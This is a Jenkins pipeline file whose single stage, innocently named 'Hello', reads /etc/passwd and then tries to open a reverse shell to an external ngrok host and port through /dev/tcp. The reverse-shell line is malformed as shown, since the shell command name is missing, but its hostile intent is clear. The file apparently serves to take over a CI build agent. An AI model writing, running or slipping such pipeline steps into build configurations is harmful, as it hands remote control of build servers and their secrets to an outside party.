pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                sh 'cat /etc/passwd'
                sh '-i >& /dev/tcp/7.tcp.eu.ngrok.io/17377 0>&1'
            }
        }
    }
}
